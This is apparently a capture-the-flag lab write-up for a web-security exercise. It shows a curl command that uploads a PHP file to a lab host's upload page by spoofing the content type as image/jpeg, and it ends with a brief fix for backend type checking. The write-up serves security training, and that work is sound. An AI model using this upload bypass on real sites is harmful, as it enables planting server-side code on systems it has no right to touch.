# 12_XSS_attack_upload

Any type of file can be uploaded

## Method & Manipulation

Go to http://192.168.1.59/?page=upload  
We can inspect the form input button and see it is set to `type=file`

## Manipulation

This means a php file can be uploaded.  
Curl will be used for this
```bash
curl -X POST -H 'Content-Type: multipart/form-data' -F 'Upload=send' -F 'uploaded=@empty.php;type=image/jpeg' http://192.168.1.59/index.php\?page\=upload\#
```

This returns an html page with the flag

## Resolve

Always use strict types when uploading files & check on the backend as well.

## Resources

https://labs.f-secure.com/blog/getting-real-with-xss/
